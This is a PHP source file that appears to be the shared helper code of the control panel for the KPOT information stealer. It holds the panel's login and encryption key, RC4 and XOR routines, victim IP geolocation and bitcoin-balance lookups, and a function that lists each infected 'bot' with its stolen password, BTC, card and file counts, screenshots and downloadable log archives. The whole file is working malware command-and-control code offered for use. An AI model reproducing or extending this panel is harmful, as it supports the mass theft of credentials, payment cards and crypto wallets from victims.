<?php
define('LOGIN', 'torkin');
define('PASSWORD_MD5', '1b2cb1991c40762b259b2d67320d0b81');
define('GUEST_LOGIN', 'guest');
define('GUEST_PASSWORD', 'guest');
define('ENCRYPTION_KEY', 'EZ1GDWerLlqpckqv');
define('DB_HOST', 'localhost');
define('DB_NAME', 'kpot');
define('DB_USER', 'root');
define('DB_PASS', '');

function is_reserved_ip($ip)
{
    $reserved_ips = array(
    '167772160'  => 184549375,  /*    10.0.0.0 -  10.255.255.255 */
    '3232235520' => 3232301055, /* 192.168.0.0 - 192.168.255.255 */
    '2130706432' => 2147483647, /*   127.0.0.0 - 127.255.255.255 */
    '2851995648' => 2852061183, /* 169.254.0.0 - 169.254.255.255 */
    '2886729728' => 2887778303, /*  172.16.0.0 -  172.31.255.255 */
    '3758096384' => 4026531839, /*   224.0.0.0 - 239.255.255.255 */
    );

    $ip_long = sprintf('%u', ip2long($ip));

    foreach ($reserved_ips as $ip_start => $ip_end) if (($ip_long >= $ip_start) && ($ip_long <= $ip_end))
    {
		return true;
    }
    return false;
}

function getClientIp()
{
    $client_ip = '';
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']) && filter_var($_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
        $client_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else $client_ip = $_SERVER['REMOTE_ADDR'];
    return $client_ip;
}

function getBtcAddrInfo($data)
{
	$info_url = 'https://blockchain.info/rawaddr/%s?limit=0';
	if ($address = strstr($data, 'name"'))
	{
		$address = substr($address, 5);
		for ($i = 0; $i < 64; ++$i)
		{
			if (ord($address[$i]) < 32 || ord($address[$i]) > 128)
			{
				$address = substr($address, 0, $i);
				break;
			}
		}
		$info_url = sprintf($info_url, htmlspecialchars($address, ENT_QUOTES, 'UTF-8'));
		$json_info = file_get_contents($info_url);
		if ($info = json_decode($json_info))
		{
			$balance = $info->final_balance / 100000000.0;
			return sprintf('Address: %s<br>Balance: %f BTC<br>', $address, $balance);
		}
	}
	return 'Address: unknown<br>Balance: unknown<br>';
}

function getStateZipByIp($ip)
{
	if (!is_reserved_ip($ip))
	{
		$info_url = 'https://api.ipgeolocation.io/ipgeo?include=hostname&ip='.$ip;
		$referer = "https://ipgeolocation.io/";
		$options = array(
			'http' => array(
				'header' => array("Referer: $referer\r\n")
			)
		);
		$context = stream_context_create($options);
		$json_info = file_get_contents($info_url, false, $context);
		if ($info = json_decode($json_info)) return sprintf("State: %s<br>Zipcode: %s", $info->state_prov, $info->zipcode);
	}
	return "State: Unknown<br>Zipcode: unknown";
}

function get_IL_from_index($il_index) {
    $result = 'unknown';
    switch ($il_index)
    {
        case 0: $result = 'unknown'; break;
        case 1: $result = 'low'; break;
        case 2: $result = 'medium'; break;
        case 3: $result = 'high'; break;
        case 4: $result = 'system'; break;
        default: break;
    }
    return $result;
}

function rc4($data_str, $key_str) {
	$key = array();
	$data = array();
	for ( $i = 0; $i < strlen($key_str); $i++ ) $key[$i] = ord($key_str[$i]);
	for ( $i = 0; $i < strlen($data_str); $i++ ) $data[$i] = ord($data_str[$i]);
	$state = array( 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,
					16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,
					32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,
					48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,
					64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,
					80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,
					96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,
					112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,
					128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,
					144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,
					160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,
					176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,
					192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,
					208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,
					224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,
					240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255 );
	$len = count($key);
	$index1 = $index2 = 0;
	for( $counter = 0; $counter < 256; $counter++ ){
		$index2   = ( $key[$index1] + $state[$counter] + $index2 ) % 256;
		$tmp = $state[$counter];
		$state[$counter] = $state[$index2];
		$state[$index2] = $tmp;
		$index1 = ($index1 + 1) % $len;
	}
	// rc4
	$len = count($data);
	$x = $y = 0;
	for ($counter = 0; $counter < $len; $counter++) {
		$x = ($x + 1) % 256;
		$y = ($state[$x] + $y) % 256;
		$tmp = $state[$x];
		$state[$x] = $state[$y];
		$state[$y] = $tmp;
		$data[$counter] ^= $state[($state[$x] + $state[$y]) % 256];
	}
	// convert output back to a string
	$data_str = "";
	for ( $i = 0; $i < $len; $i++ ) {
		$data_str .= chr($data[$i]);
	}
	return $data_str;
}

function XORCipher($data, $key) {
	$keyLen = strlen($key);
	$output = $data;

	for ($i = 0; $i < strlen($data); ++$i) $output[$i] = $data[$i] ^ $key[$i % $keyLen];

	return $output;
}

function file_download($filename, $mimetype='application/octet-stream') {
	if(file_exists($filename))
	{
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($filename).'"');
        header('Expires: 0');
        header('Pragma: no-cache');
        header('Content-Length: ' . filesize($filename));
        flush();
        readfile($filename);
    }
	else
	{
        header($_SERVER["SERVER_PROTOCOL"] . ' 404 Not Found');
        header('Status: 404 Not Found');
    }
}

function getConfig($table_name)
{
    return parse_ini_file('config.ini', TRUE)[$table_name];
}

function mysqlExecute($statement)
{
    $link = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_NAME) or die();
    mysqli_query($link, $statement);
    mysqli_close($link);
}

function mysqlQuery($statement) {
    $result = array();
    $conn = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_NAME) or die();
    $queryRes = mysqli_query($conn, $statement);
    if (!$queryRes) {
        mysqli_close($conn);
        die();
    }
    for ($i = 0; $row = mysqli_fetch_assoc($queryRes); ++$i) {
        array_push($result, $row);
        foreach ($result[$i] as $key => $value) $result[$i][$key] = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
    }
    mysqli_close($conn);
    return $result;
}

function human_filesize($bytes) {
    $sz = 'BKMGTP';
    $factor = floor((strlen($bytes) - 1) / 3);
    return sprintf("%.2f", $bytes / pow(1024, $factor)) . @$sz[$factor];
}

function printBot($bot_row)
{
    $bot_id = $bot_row['guid'];
    $rep_id = $bot_row['rep_id'];
    $il = get_IL_from_index($bot_row['il']);
    $date = gmdate('H:i:s d-m-Y', $bot_row['timestamp']);
    $zipfile = 'files/'.$bot_row['zipname'];
    $status = $bot_row['checked'] ? 'checked' : '';
    $screenpath = 'screenshots/'.$rep_id.'-'.$bot_id.'.png';
	$dropdown_id = 'dropdown'.$rep_id;
    echo "<tr>";
	echo "<td data-label='CHECKBOX'><input type='checkbox' name='selection' value='{$rep_id}'></td>";
    echo "<td data-label='ID' >{$rep_id}</td>";
    echo "<td data-label='GUID' class='longtext'><span>{$bot_id}</span></td>";
    echo "<td data-label='IP' >{$bot_row['ip']}</td>";
    echo sprintf('<td data-label="Country" >%s(%s)</td>', $bot_row['country_code'], $bot_row['country']);
    echo "<td data-label='OS'>{$bot_row['os_name']}</td>";
    //echo sprintf("<td>%s(%s)</td>", $bot_row['pcname'], $bot_row['username']);
    //echo "<td>{$bot_row['admin']}</td>";
    echo "<td data-label='IL'>{$il}</td>";
    echo sprintf("<td data-label='PWD | BTC | CC | Files'>%d | %d | %d | %d</td>", $bot_row['pwd_count'], $bot_row['btc_count'], $bot_row['cc_count'], $bot_row['files_count']);

    echo sprintf("<td data-label='Comment'> <input type='text' value='%s' onkeydown='%s'></td>", $bot_row['comment'],
        'if (event.keyCode==13)makePost('.'"action=addComment&comment="+this.value+"&rep_id='.$rep_id.'", "reports.php")');
    echo sprintf("<td data-label='Checked'> <input type='checkbox' %s onclick='%s'> </td>", $status,
         'makePost('.'"action=setChecked&checked="+this.checked+"&rep_id='.$rep_id.'", "reports.php")');
    echo "<td data-label='Log Date'>$date</td><td data-label='Button'>";
    $passwordsButton = sprintf("<a href='passwords.php?rep_id=%d' target='_blank'>Passwords</a>", $rep_id);
	$favouriteButton = sprintf("<a href='#!' onclick='%s'>%s</a>", 'toggleFavourite('.$rep_id.', this)',
		$bot_row['favourite'] ? 'Unmark favourite' : 'Mark favourite');
	$screenButton = file_exists($screenpath) ? "<a href='$screenpath' target='_blank' class='table-button'>Screen</a> " : '';
	$downloadButton = file_exists($zipfile) ? sprintf("<a class='download-button' href='%s'><span style='margin-left: 3px; margin-right: 15px; position: relative; top: -3px;'>DL %s</span></a>", $zipfile, human_filesize(filesize($zipfile))) : '';
	echo sprintf('<div class="dropdown">
			<button onclick="toggleDropdown(\'%s\')" class="dropbtn">Actions</button>
			<div id="%s" class="dropdown-content">
			'."<a href='#!' onclick='%s' data-fancybox data-src='#implinks-preview'>IL</a>".'
			'."<a href='javascript:;' onclick='%s' data-fancybox data-src='#log-preview'>Preview</a>".'
			'.$screenButton.'
			'.$favouriteButton.'
            '.$passwordsButton.'
			'."<a href='#!' onclick='%s' data-fancybox data-src='#extrainfo-preview'>More info</a>".'
			'.$downloadButton.'
			'."<a href='#!' onclick='%s'>Delete</a>".'
			</div>
		</div>', $dropdown_id, $dropdown_id, 'setImpLinks('.$rep_id.')', 'setLogPreview('.$rep_id.', "'.$bot_row['zipname'].'")',
        'setExtraInfo('.$rep_id.')', '{delRow(this.parentNode.parentNode); makePost('.'"action=deleteLog&rep_id='.$rep_id.'");}');
    echo '</td></tr>';
}

?>
